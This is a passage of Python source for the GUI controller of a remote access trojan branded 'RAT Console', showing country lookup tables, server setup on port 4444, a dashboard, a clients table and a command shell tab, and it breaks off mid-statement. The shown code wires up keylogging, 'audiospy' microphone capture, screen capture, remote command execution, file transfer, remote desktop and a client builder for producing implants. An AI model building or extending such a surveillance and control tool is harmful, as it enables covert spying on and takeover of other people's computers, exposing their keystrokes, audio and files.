        self.allow_local_ip_lookup = self.local_ip_var.get()
        self.log_message(f"Local IP resolution {'enabled' if self.allow_local_ip_lookup else 'disabled'}")
    
    def get_country_center(self, country_code):
        """Get the approximate center coordinates of a country by code"""
        # Dict of country centers (latitude, longitude)
        country_centers = {
            "US": (37.0902, -95.7129),  # United States
            "GB": (55.3781, -3.4360),   # United Kingdom
            "CA": (56.1304, -106.3468), # Canada
            "AU": (-25.2744, 133.7751), # Australia
            "DE": (51.1657, 10.4515),   # Germany
            "FR": (46.2276, 2.2137),    # France
            "IT": (41.8719, 12.5674),   # Italy
            "ES": (40.4637, -3.7492),   # Spain
            "JP": (36.2048, 138.2529),  # Japan
            "CN": (35.8617, 104.1954),  # China
            "IN": (20.5937, 78.9629),   # India
            "BR": (-14.2350, -51.9253), # Brazil
            "RU": (61.5240, 105.3188),  # Russia
            # Add more countries as needed
        }
        
        return country_centers.get(country_code.upper())
    
    def get_country_name(self, country_code):
        """Get the country name from country code"""
        country_names = {
            "US": "United States",
            "GB": "United Kingdom",
            "CA": "Canada",
            "AU": "Australia",
            "DE": "Germany",
            "FR": "France",
            "IT": "Italy",
            "ES": "Spain",
            "JP": "Japan",
            "CN": "China",
            "IN": "India",
            "BR": "Brazil",
            "RU": "Russia",
            # Add more as needed
        }
        
        return country_names.get(country_code.upper(), "Unknown Country")
                
                
        
class RATServerGUI:
    def __init__(self):
        # Initialize server variables
        self.ip = self.get_local_ip()
        self.port = 4444
        self.address = (self.ip, self.port)
        self.is_server_running = False
        self.receive_screenshot_trigger = False
        self.audiospy_trigger = False
        self.keyboard_recording_trigger = False
        self.clients = {}
        self.threads_tracker = {}
        self.BUFFER = 4096
        self.client_counter = 0
        self.current_theme = "Dark"
        self.server_socket = None
        self.current_client_socket = None
        self.advanced_monitoring = None
        # Make themes accessible to the instance
        self.THEMES = THEMES

        # Setup GUI
        self.setup_gui()
        
        # Initialize theme manager to handle theme changes
        self.setup_theme_manager()
    
    def get_local_ip(self):
        s = socket.socket()
        s.connect(('1.1.1.1', 80))
        
        return str(s.getsockname()[0])
    
    def setup_gui(self):
        # Configure custom tkinter
        ctk.set_appearance_mode("Dark")
        ctk.set_default_color_theme("blue")
        
        # Create root window
        self.root = ctk.CTk()
        self.root.title("Advanced Remote Administration Tool")
        self.root.geometry("1200x700")
        self.root.minsize(800, 600)
        
        # Create main frame
        self.main_frame = ctk.CTkFrame(self.root)
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Split into left sidebar and right content
        self.sidebar_frame = ctk.CTkFrame(self.main_frame, width=200)
        self.sidebar_frame.pack(side=tk.LEFT, fill=tk.Y, padx=5, pady=5)
        
        self.content_frame = ctk.CTkFrame(self.main_frame)
        self.content_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Setup sidebar
        self.setup_sidebar()
        
        # Setup content area
        self.setup_content_area()
        
        # Setup status bar
        self.status_bar = ctk.CTkLabel(self.root, text="Ready", anchor="w")
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X, padx=10, pady=5)
        
        # Load settings
        self.load_settings()
        
    def setup_theme_manager(self):
        """Initialize the theme manager and track all theme-sensitive widgets."""
        self.theme_manager = ThemeManager(self, THEMES)
        
        # Track main frames
        self.theme_manager.track_widget(self.main_frame)
        self.theme_manager.track_widget(self.sidebar_frame)
        self.theme_manager.track_widget(self.content_frame)
        
        # Track notebook
        self.theme_manager.track_widget(self.notebook, "notebook")
        
        # Track tab frames
        self.theme_manager.track_widget(self.dashboard_frame)
        self.theme_manager.track_widget(self.clients_frame)
        self.theme_manager.track_widget(self.command_frame)
        self.theme_manager.track_widget(self.monitoring_frame)
        self.theme_manager.track_widget(self.settings_frame)
        
        # Track scrolledtext widgets
        self.theme_manager.track_widget(self.log_text, "scrolledtext")
        self.theme_manager.track_widget(self.terminal_output, "scrolledtext")
        if hasattr(self, 'keyboard_log'):
            self.theme_manager.track_widget(self.keyboard_log, "scrolledtext")
        
        # Track treeviews
        self.theme_manager.track_widget(self.clients_tree, "treeview")
        
        # Track menus
        self.theme_manager.track_widget(self.client_menu, "menu")
        
        # Track custom labels
        self.theme_manager.track_widget(self.server_status_value, "label")
        self.theme_manager.track_widget(self.clients_value, "label")
        self.theme_manager.track_widget(self.screen_display, "label")
        self.theme_manager.track_widget(self.audio_display, "label")
        self.theme_manager.track_widget(self.connected_client_label, "label")
        self.theme_manager.track_widget(self.status_bar, "label")
        
        # Track buttons
        buttons = [
            self.start_server_btn, 
            self.stop_server_btn,
            self.start_screen_btn,
            self.stop_screen_btn,
            self.start_audio_btn,
            self.stop_audio_btn,
            self.start_keyboard_btn,
            self.stop_keyboard_btn
        ]
        for button in buttons:
            self.theme_manager.track_widget(button)
            
        # Apply initial theme
        self.theme_manager.apply_theme(self.current_theme)

    def setup_sidebar(self):
        # Get theme colors
        theme = self.THEMES[self.current_theme]
        
        # Logo/Title
        logo_label = ctk.CTkLabel(self.sidebar_frame, text="RAT Console", 
                                font=ctk.CTkFont(size=20, weight="bold"),
                                text_color=theme["fg_color"])
        logo_label.pack(pady=20)
        
        # Server controls
        server_frame = ctk.CTkFrame(self.sidebar_frame, fg_color=theme["card_color"])
        server_frame.pack(fill=tk.X, padx=10, pady=10)
        
        server_label = ctk.CTkLabel(server_frame, text="Server Controls", 
                                  font=ctk.CTkFont(weight="bold"),
                                  text_color=theme["fg_color"])
        server_label.pack(pady=5)
        
        # IP and Port inputs
        ip_frame = ctk.CTkFrame(server_frame, fg_color="transparent")
        ip_frame.pack(fill=tk.X, pady=5)
        
        ip_label = ctk.CTkLabel(ip_frame, text="IP:", width=30)
        ip_label.pack(side=tk.LEFT, padx=5)
        
        self.ip_entry = ctk.CTkEntry(ip_frame, fg_color=theme["bg_color"], 
                                   text_color=theme["fg_color"])
        self.ip_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.ip_entry.insert(0, self.ip)
        
        port_frame = ctk.CTkFrame(server_frame, fg_color="transparent")
        port_frame.pack(fill=tk.X, pady=5)
        
        port_label = ctk.CTkLabel(port_frame, text="Port:", width=30)
        port_label.pack(side=tk.LEFT, padx=5)
        
        self.port_entry = ctk.CTkEntry(port_frame, fg_color=theme["bg_color"], 
                                     text_color=theme["fg_color"])
        self.port_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.port_entry.insert(0, str(self.port))
        
        # Server buttons
        self.start_server_btn = ctk.CTkButton(server_frame, text="Start Server", 
                                            command=self.start_server_gui,
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"])
        self.start_server_btn.pack(fill=tk.X, pady=5)
        
        self.stop_server_btn = ctk.CTkButton(server_frame, text="Stop Server", 
                                           command=self.stop_server, 
                                           state="disabled",
                                           fg_color=theme["button_color"],
                                           hover_color=theme["hover_color"])
        self.stop_server_btn.pack(fill=tk.X, pady=5)
        
        # Theme selection
        theme_frame = ctk.CTkFrame(self.sidebar_frame, fg_color=theme["card_color"])
        theme_frame.pack(fill=tk.X, padx=10, pady=10)
        
        theme_label = ctk.CTkLabel(theme_frame, text="Appearance", 
                                 font=ctk.CTkFont(weight="bold"),
                                 text_color=theme["fg_color"])
        theme_label.pack(pady=5)
        
        self.theme_var = tk.StringVar(value=self.current_theme)
        theme_options = ctk.CTkOptionMenu(theme_frame, values=list(THEMES.keys()), 
                                        variable=self.theme_var, 
                                        command=self.change_theme,
                                        fg_color=theme["button_color"],
                                        button_color=theme["button_color"],
                                        button_hover_color=theme["hover_color"],
                                        dropdown_fg_color=theme["card_color"],
                                        dropdown_hover_color=theme["hover_color"],
                                        dropdown_text_color=theme["fg_color"],
                                        text_color=theme["fg_color"])
        theme_options.pack(fill=tk.X, pady=5)

    def setup_content_area(self):
       # Create notebook for tabbed interface
        self.notebook = ttk.Notebook(self.content_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        theme = self.THEMES[self.current_theme]
        self.theme_manager = ThemeManager(self, THEMES)
        self.theme_manager.track_widget(self.notebook, "notebook") 
        
        # Dashboard tab
        self.dashboard_frame = ctk.CTkFrame(self.notebook, fg_color=theme["card_color"], bg_color=theme["bg_color"])
        self.notebook.add(self.dashboard_frame, text="Dashboard")
        self.setup_dashboard()
        
        # Clients tab
        self.clients_frame = ctk.CTkFrame(self.notebook, fg_color=theme["card_color"], bg_color=theme["bg_color"])
        self.notebook.add(self.clients_frame, text="Clients")  
        self.setup_clients_tab()
        
        self.geo_mapping = EnhancedClientGeoMapping(self.notebook, self)
        
        # Command tab
        self.command_frame = ctk.CTkFrame(self.notebook, fg_color=theme["card_color"], bg_color=theme["bg_color"])
        self.notebook.add(self.command_frame, text="Command Shell")
        self.setup_command_tab()
        
        # Monitoring tab
        self.monitoring_frame = ctk.CTkFrame(self.notebook, fg_color=theme["card_color"], bg_color=theme["bg_color"])
        self.notebook.add(self.monitoring_frame, text="Monitoring")
        self.setup_monitoring_tab()
        
        # Initialize File Transfer System
        self.file_transfer = FileTransferSystem(self.notebook, self)
        
        self.process_manager = ProcessManager(self.notebook, self)
        
        # Initialize Advanced Monitoring
        self.advanced_monitoring = AdvancedMonitoringInterface(self.notebook, self)
        
        # Initialize Desktop Control
        self.remote_desktop = RemoteDesktopControl(self.notebook, self)
        
        # Initialize Client Builder Utility
        self.client_builder = ClientBuilderUtility(self.notebook, self)
        
        # Settings tab
        self.settings_frame = ctk.CTkFrame(self.notebook, fg_color=theme["card_color"], bg_color=theme["bg_color"])
        self.notebook.add(self.settings_frame, text="Settings")
        self.setup_settings_tab()
        
    def setup_dashboard(self):
        """Set up an enhanced dashboard with modern metrics and visual elements"""
        # Get theme colors
        theme = self.THEMES[self.current_theme]
        
        # Create a grid layout for better organization
        dashboard_left = ctk.CTkFrame(self.dashboard_frame, fg_color="transparent")
        dashboard_left.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=10)
        
        dashboard_right = ctk.CTkFrame(self.dashboard_frame, fg_color="transparent")
        dashboard_right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5, pady=10)
        
        # ===== LEFT COLUMN =====
        # Server Status Card with enhanced information
        status_frame = ctk.CTkFrame(dashboard_left, fg_color=theme["card_color"], corner_radius=10)
        status_frame.pack(fill=tk.X, padx=10, pady=10)
        
        status_header = ctk.CTkLabel(status_frame, text="Server Status", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]),
                                text_color=theme["fg_color"])
        status_header.pack(anchor="w", padx=15, pady=10)
        
        # Status indicators with better layout and icons (using text placeholders for icons)
        indicators_frame = ctk.CTkFrame(status_frame, fg_color="transparent")
        indicators_frame.pack(fill=tk.X, padx=15, pady=5)
        
        # Server status with icon indicator
        server_status_row = ctk.CTkFrame(indicators_frame, fg_color="transparent")
        server_status_row.pack(fill=tk.X, pady=3)
        
        server_icon = ctk.CTkLabel(server_status_row, text="", width=30, 
                                font=ctk.CTkFont(size=16))
        server_icon.pack(side=tk.LEFT, padx=5)
        
        server_status_label = ctk.CTkLabel(server_status_row, text="Server Status:", 
                                        font=ctk.CTkFont(weight="bold"), width=100)
        server_status_label.pack(side=tk.LEFT, padx=5)
        
        self.server_status_value = ctk.CTkLabel(server_status_row, text="Offline", 
                                            text_color=theme["danger_color"])
        self.server_status_value.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        # Server address with icon
        address_row = ctk.CTkFrame(indicators_frame, fg_color="transparent")
        address_row.pack(fill=tk.X, pady=3)
        
        address_icon = ctk.CTkLabel(address_row, text="", width=30, 
                                font=ctk.CTkFont(size=16))
        address_icon.pack(side=tk.LEFT, padx=5)
        
        address_label = ctk.CTkLabel(address_row, text="IP Address:", 
                                font=ctk.CTkFont(weight="bold"), width=100)
        address_label.pack(side=tk.LEFT, padx=5)
        
        self.server_address_value = ctk.CTkLabel(address_row, text=f"{self.ip}:{self.port}")
        self.server_address_value.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        # Active clients with icon
        clients_row = ctk.CTkFrame(indicators_frame, fg_color="transparent")
        clients_row.pack(fill=tk.X, pady=3)
        
        clients_icon = ctk.CTkLabel(clients_row, text="", width=30, 
                                font=ctk.CTkFont(size=16))
        clients_icon.pack(side=tk.LEFT, padx=5)
        
        clients_label = ctk.CTkLabel(clients_row, text="Active Clients:", 
                                font=ctk.CTkFont(weight="bold"), width=100)
        clients_label.pack(side=tk.LEFT, padx=5)
        
        self.clients_value = ctk.CTkLabel(clients_row, text="0")
        self.clients_value.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        # Uptime with icon
        uptime_row = ctk.CTkFrame(indicators_frame, fg_color="transparent")
        uptime_row.pack(fill=tk.X, pady=3)
        
        uptime_icon = ctk.CTkLabel(uptime_row, text="", width=30, 
                                font=ctk.CTkFont(size=16))
        uptime_icon.pack(side=tk.LEFT, padx=5)
        
        uptime_label = ctk.CTkLabel(uptime_row, text="Uptime:", 
                                font=ctk.CTkFont(weight="bold"), width=100)
        uptime_label.pack(side=tk.LEFT, padx=5)
        
        self.uptime_value = ctk.CTkLabel(uptime_row, text="00:00:00")
        self.uptime_value.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        # Start uptime timer if server is running
        self.start_time = None
        self.uptime_timer_active = False
        
        # Quick Actions Card
        actions_frame = ctk.CTkFrame(dashboard_left, fg_color=theme["card_color"], corner_radius=10)
        actions_frame.pack(fill=tk.X, padx=10, pady=10)
        
        actions_header = ctk.CTkLabel(actions_frame, text="Quick Actions", 
                                    font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                    size=FONT_STYLES["subheading"][1], 
                                                    weight=FONT_STYLES["subheading"][2]),
                                    text_color=theme["fg_color"])
        actions_header.pack(anchor="w", padx=15, pady=10)
        
        # Create a grid of action buttons
        actions_grid = ctk.CTkFrame(actions_frame, fg_color="transparent")
        actions_grid.pack(fill=tk.X, padx=15, pady=5)
        
        # Row 1
        action_row1 = ctk.CTkFrame(actions_grid, fg_color="transparent")
        action_row1.pack(fill=tk.X, pady=5)
        
        refresh_btn = ctk.CTkButton(action_row1, text="Refresh Clients", 
                                image=self.load_icon_placeholder("refresh"),
                                command=self.refresh_clients,
                                fg_color=theme["button_color"],
                                hover_color=theme["hover_color"],
                                corner_radius=6,
                                compound="left")
        refresh_btn.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        disconnect_all_btn = ctk.CTkButton(action_row1, text="Disconnect All", 
                                        image=self.load_icon_placeholder("disconnect"),
                                        command=self.disconnect_all,
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"],
                                        corner_radius=6,
                                        compound="left")
        disconnect_all_btn.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        # Row 2 
        action_row2 = ctk.CTkFrame(actions_grid, fg_color="transparent")
        action_row2.pack(fill=tk.X, pady=5)
        
        screen_btn = ctk.CTkButton(action_row2, text="Screen Capture", 
                                image=self.load_icon_placeholder("screen"),
                                command=self.quick_screen_capture,
                                fg_color=theme["button_color"],
                                hover_color=theme["hover_color"],
                                corner_radius=6,
                                compound="left")
        screen_btn.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        shell_btn = ctk.CTkButton(action_row2, text="Command Shell", 
                                image=self.load_icon_placeholder("terminal"),
                                command=self.quick_command_shell,
                                fg_color=theme["button_color"],
                                hover_color=theme["hover_color"],
                                corner_radius=6,
                                compound="left")
        shell_btn.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        # Activity Log with enhanced styling
        log_frame = ctk.CTkFrame(dashboard_left, fg_color=theme["card_color"], corner_radius=10)
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        log_header = ctk.CTkLabel(log_frame, text="Activity Log", 
                            font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                            size=FONT_STYLES["subheading"][1], 
                                            weight=FONT_STYLES["subheading"][2]),
                            text_color=theme["fg_color"])
        log_header.pack(anchor="w", padx=15, pady=10)
        
        # Control buttons for log
        log_controls = ctk.CTkFrame(log_frame, fg_color="transparent")
        log_controls.pack(fill=tk.X, padx=15, pady=0)
        
        clear_log_btn = ctk.CTkButton(log_controls, text="Clear Log", 
                                    command=self.clear_activity_log,
                                    fg_color=theme["button_color"],
                                    hover_color=theme["hover_color"],
                                    width=80, height=25,
                                    corner_radius=6)
        clear_log_btn.pack(side=tk.LEFT, padx=5)
        
        save_log_btn = ctk.CTkButton(log_controls, text="Save Log", 
                                command=self.save_activity_log,
                                fg_color=theme["button_color"],
                                hover_color=theme["hover_color"],
                                width=80, height=25,
                                corner_radius=6)
        save_log_btn.pack(side=tk.LEFT, padx=5)
        
        # Enhanced log with colored tags for different event types
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, 
                                            background=theme["bg_color"], 
                                            foreground=theme["fg_color"], 
                                            height=15, 
                                            borderwidth=0,
                                            font=("Consolas", 9))
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
        self.log_text.configure(state="disabled")
        
        # Configure tags for different log levels
        self.log_text.tag_configure("info", foreground="#ffffff")
        self.log_text.tag_configure("warning", foreground="#ffcc00")
        self.log_text.tag_configure("error", foreground="#ff5555")
        self.log_text.tag_configure("success", foreground="#55ff55")
        self.log_text.tag_configure("client", foreground="#5555ff")
        
        # ===== RIGHT COLUMN =====
        # System Performance Card
        performance_frame = ctk.CTkFrame(dashboard_right, fg_color=theme["card_color"], corner_radius=10)
        performance_frame.pack(fill=tk.X, padx=10, pady=10)
        
        performance_header = ctk.CTkLabel(performance_frame, text="System Performance", 
                                        font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                        size=FONT_STYLES["subheading"][1], 
                                                        weight=FONT_STYLES["subheading"][2]),
                                        text_color=theme["fg_color"])
        performance_header.pack(anchor="w", padx=15, pady=10)
        
        # CPU usage
        cpu_frame = ctk.CTkFrame(performance_frame, fg_color="transparent")
        cpu_frame.pack(fill=tk.X, padx=15, pady=5)
        
        cpu_label = ctk.CTkLabel(cpu_frame, text="CPU Usage:", 
                            font=ctk.CTkFont(weight="bold"), width=100)
        cpu_label.pack(side=tk.LEFT, padx=5)
        
        self.cpu_value = ctk.CTkLabel(cpu_frame, text="0%", width=50)
        self.cpu_value.pack(side=tk.LEFT, padx=5)
        
        self.cpu_progress = ctk.CTkProgressBar(cpu_frame, width=150, height=15, 
                                            progress_color=theme["accent_color"],
                                            corner_radius=5)
        self.cpu_progress.pack(side=tk.LEFT, padx=10, fill=tk.X, expand=True)
        self.cpu_progress.set(0)
        
        # Memory usage
        memory_frame = ctk.CTkFrame(performance_frame, fg_color="transparent")
        memory_frame.pack(fill=tk.X, padx=15, pady=5)
        
        memory_label = ctk.CTkLabel(memory_frame, text="Memory Usage:", 
                                font=ctk.CTkFont(weight="bold"), width=100)
        memory_label.pack(side=tk.LEFT, padx=5)
        
        self.memory_value = ctk.CTkLabel(memory_frame, text="0%", width=50)
        self.memory_value.pack(side=tk.LEFT, padx=5)
        
        self.memory_progress = ctk.CTkProgressBar(memory_frame, width=150, height=15, 
                                                progress_color=theme["info_color"],
                                                corner_radius=5)
        self.memory_progress.pack(side=tk.LEFT, padx=10, fill=tk.X, expand=True)
        self.memory_progress.set(0)
        
        # Network usage
        network_frame = ctk.CTkFrame(performance_frame, fg_color="transparent")
        network_frame.pack(fill=tk.X, padx=15, pady=5)
        
        network_label = ctk.CTkLabel(network_frame, text="Network I/O:", 
                                font=ctk.CTkFont(weight="bold"), width=100)
        network_label.pack(side=tk.LEFT, padx=5)
        
        self.network_value = ctk.CTkLabel(network_frame, text="0 KB/s", width=150)
        self.network_value.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        # Clients Overview (Mini map)
        clients_overview_frame = ctk.CTkFrame(dashboard_right, fg_color=theme["card_color"], corner_radius=10)
        clients_overview_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        clients_header = ctk.CTkLabel(clients_overview_frame, text="Clients Overview", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]),
                                text_color=theme["fg_color"])
        clients_header.pack(anchor="w", padx=15, pady=10)
        
        # Create a mini world map (placeholder)
        self.mini_map_frame = ctk.CTkFrame(clients_overview_frame, 
                                        fg_color=theme["bg_color"], 
                                        height=200, 
                                        corner_radius=5)
        self.mini_map_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 10))
        
        # Add a placeholder text that will be replaced with actual map
        map_label = ctk.CTkLabel(self.mini_map_frame, 
                            text="Client locations will be displayed here\nwhen Geo Mapping module is activated",
                            font=ctk.CTkFont(size=12))
        map_label.pack(fill=tk.BOTH, expand=True)
        
        # Recent Events / Alerts Card
        alerts_frame = ctk.CTkFrame(dashboard_right, fg_color=theme["card_color"], corner_radius=10)
        alerts_frame.pack(fill=tk.X, padx=10, pady=10)
        
        alerts_header = ctk.CTkLabel(alerts_frame, text="Recent Alerts", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]),
                                text_color=theme["fg_color"])
        alerts_header.pack(anchor="w", padx=15, pady=10)
        
        # Create a listbox for alerts with custom styling
        self.alerts_box = tk.Listbox(alerts_frame, 
                                bg=theme["bg_color"], 
                                fg=theme["fg_color"],
                                selectbackground=theme["accent_color"],
                                highlightthickness=0,
                                borderwidth=0,
                                height=4,
                                font=("Segoe UI", 9))
        self.alerts_box.pack(fill=tk.BOTH, padx=15, pady=(0, 10))
        
        # Add some initial alerts
        self.alerts_box.insert(tk.END, "Server ready - No active alerts")
        
        # Start performance monitoring thread
        self.start_performance_monitoring()
        
        # Register new widgets with theme manager
        if hasattr(self, 'theme_manager'):
            self.theme_manager.track_widget(self.server_address_value, "label")
            self.theme_manager.track_widget(self.uptime_value, "label")
            self.theme_manager.track_widget(self.cpu_value, "label")
            self.theme_manager.track_widget(self.cpu_progress)
            self.theme_manager.track_widget(self.memory_value, "label")
            self.theme_manager.track_widget(self.memory_progress)
            self.theme_manager.track_widget(self.network_value, "label")
            self.theme_manager.track_widget(self.mini_map_frame)
            self.theme_manager.track_widget(self.alerts_box, "label")
            self.theme_manager.track_widget(log_frame)
            self.theme_manager.track_widget(actions_frame)
            self.theme_manager.track_widget(performance_frame)
            self.theme_manager.track_widget(clients_overview_frame)
            self.theme_manager.track_widget(alerts_frame)



    def load_icon_placeholder(self, icon_name):
        """
        Create a placeholder for icons until proper icons are implemented
        In a production environment, replace this with actual icon loading
        """
        # Will return None to indicate no icon
        # This can be replaced with actual icon loading code when available
        return None
    
    
    def clear_activity_log(self):
        """Clear the activity log"""
        self.log_text.configure(state="normal")
        self.log_text.delete(1.0, tk.END)
        self.log_text.configure(state="disabled")
        self.add_alert("Activity log cleared")
        
    def save_activity_log(self):
        """Save activity log to a file"""
        try:
            file_path = filedialog.asksaveasfilename(
                defaultextension=".log",
                filetypes=[("Log files", "*.log"), ("Text files", "*.txt"), ("All files", "*.*")],
                title="Save Activity Log"
            )
            
            if file_path:
                log_content = self.log_text.get(1.0, tk.END)
                with open(file_path, 'w') as f:
                    f.write(log_content)
                self.log(f"Activity log saved to {file_path}", log_type="success")
                self.add_alert(f"Log saved to {os.path.basename(file_path)}")
        except Exception as e:
            self.log(f"Error saving log: {e}", log_type="error")
            
    def setup_clients_tab(self):
        
        # Get theme colors
        theme = self.THEMES[self.current_theme]
        
        # Create toolbar
        toolbar_frame = ctk.CTkFrame(self.clients_frame, fg_color=theme["card_color"])
        toolbar_frame.pack(fill=tk.X, padx=10, pady=10)
        
        refresh_btn = ctk.CTkButton(toolbar_frame, text="Refresh", 
                                command=self.refresh_clients,
                                fg_color=theme["button_color"],
                                hover_color=theme["hover_color"])
        refresh_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        # Create clients table frame
        table_frame = ctk.CTkFrame(self.clients_frame, fg_color=theme["card_color"])
        table_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Configure treeview style first before creating the treeview
        style = ttk.Style()
        style.configure("Custom.Treeview", 
                        background=theme["card_color"],
                        foreground=theme["fg_color"],
                        fieldbackground=theme["card_color"],
                        borderwidth=0,
                        highlightthickness=0)
        
        style.map("Custom.Treeview",
                background=[("selected", theme["accent_color"])],
                foreground=[("selected", "#000000")])
        
        # Create treeview for clients with the Custom style
        columns = ("ID", "IP", "Port", "Hostname", "Status")
        self.clients_tree = ttk.Treeview(table_frame, columns=columns, show="headings", 
                                    style="Custom.Treeview")
        # Define headings
        for col in columns:
            self.clients_tree.heading(col, text=col)
            self.clients_tree.column(col, width=100)
        
        # Configure treeview to use theme colors
        style = ttk.Style()
        style.configure("Custom.Treeview", 
                        background=theme["card_color"],
                        foreground=theme["fg_color"],
                        fieldbackground=theme["card_color"],
                        font=FONT_STYLES["normal"],
                        rowheight=25)
        
        style.configure("Custom.Treeview.Heading",
                        background=theme["button_color"],
                        foreground=theme["fg_color"],
                        font=("Segoe UI", 10, "bold"),
                        relief="flat")
        
        style.map("Custom.Treeview",
                background=[("selected", theme["accent_color"])],
                foreground=[("selected", "#000000")])
        
        # Add scrollbar
        scrollbar = ttk.Scrollbar(table_frame, orient=tk.VERTICAL, 
                                command=self.clients_tree.yview,
                                style="Custom.Vertical.TScrollbar")
        self.clients_tree.configure(yscroll=scrollbar.set)
        
        # Configure scrollbar style
        style.configure("Custom.Vertical.TScrollbar", 
                        background=theme["card_color"],
                        troughcolor=theme["bg_color"],
                        arrowcolor=theme["fg_color"])
        
        # Pack components
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.clients_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Create client action buttons
        action_frame = ctk.CTkFrame(self.clients_frame, fg_color=theme["card_color"])
        action_frame.pack(fill=tk.X, padx=10, pady=10)
        
        connect_btn = ctk.CTkButton(action_frame, text="Connect", 
                                  command=self.connect_to_client,
                                  fg_color=theme["button_color"],
                                  hover_color=theme["hover_color"])
        connect_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        disconnect_btn = ctk.CTkButton(action_frame, text="Disconnect", 
                                     command=self.disconnect_client,
                                     fg_color=theme["danger_color"],
                                     hover_color=theme["hover_color"])
        disconnect_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        # Right-click menu for clients
        self.client_menu = tk.Menu(self.root, tearoff=0, 
                                 bg=theme["card_color"],
                                 fg=theme["fg_color"],
                                 activebackground=theme["hover_color"],
                                 activeforeground=theme["fg_color"])
        self.client_menu.add_command(label="Connect", command=self.connect_to_client)
        self.client_menu.add_command(label="Disconnect", command=self.disconnect_client)
        self.client_menu.add_separator()
        self.client_menu.add_command(label="View Details", command=self.view_client_details)
        
        # Bind events
        self.clients_tree.bind("<Button-3>", self.show_client_menu)
        self.clients_tree.bind("<Double-1>", lambda e: self.connect_to_client())
        
    def setup_command_tab(self):
        """Set up an enhanced command shell tab with additional features"""
        # Get theme colors
        theme = self.THEMES[self.current_theme]
        
        # Create top info frame with improved layout
        info_frame = ctk.CTkFrame(self.command_frame, fg_color=theme["card_color"])
        info_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Connected client info with more details
        client_info_frame = ctk.CTkFrame(info_frame, fg_color="transparent")
        client_info_frame.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        client_label = ctk.CTkLabel(client_info_frame, text="Connected Client:", 
                                font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                size=FONT_STYLES["normal"][1], 
                                                weight="bold"))
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.connected_client_label = ctk.CTkLabel(client_info_frame, text="None")
        self.connected_client_label.pack(side=tk.LEFT, padx=5)
        
        # Add client OS info label
        self.client_os_label = ctk.CTkLabel(client_info_frame, text="")
        self.client_os_label.pack(side=tk.LEFT, padx=(20, 5))
        
        # Add connection status indicator
        self.connection_status_indicator = ctk.CTkLabel(info_frame, text="", text_color=theme["danger_color"], 
                                                    font=ctk.CTkFont(size=20))
        self.connection_status_indicator.pack(side=tk.RIGHT, padx=10)
        
        # Command buttons for quick actions
        cmd_buttons_frame = ctk.CTkFrame(self.command_frame, fg_color=theme["card_color"])
        cmd_buttons_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        # Common command buttons
        common_commands = [
            ("System Info", "systeminfo"),
            ("Network Info", "ipconfig /all"),
            ("Processes", "tasklist"),
            ("Users", "net user"),
            ("Clear", self.clear_terminal)
        ]
        
        for label, cmd in common_commands:
            if callable(cmd):
                btn = ctk.CTkButton(cmd_buttons_frame, text=label, 
                                command=cmd,
                                fg_color=theme["button_color"],
                                hover_color=theme["hover_color"],
                                height=28)
            else:
                btn = ctk.CTkButton(cmd_buttons_frame, text=label, 
                                command=lambda c=cmd: self.quick_command(c),
                                fg_color=theme["button_color"],
                                hover_color=theme["hover_color"],
                                height=28)
            btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        # Terminal mode selection
        mode_frame = ctk.CTkFrame(cmd_buttons_frame, fg_color="transparent")
        mode_frame.pack(side=tk.RIGHT, padx=5, pady=5)
        
        mode_label = ctk.CTkLabel(mode_frame, text="Mode:")
        mode_label.pack(side=tk.LEFT, padx=5)
        
        self.terminal_mode = tk.StringVar(value="cmd")
        mode_menu = ctk.CTkOptionMenu(mode_frame, 
                                    values=["cmd", "powershell", "bash"], 
                                    variable=self.terminal_mode,
                                    command=self.change_terminal_mode,
                                    fg_color=theme["button_color"],
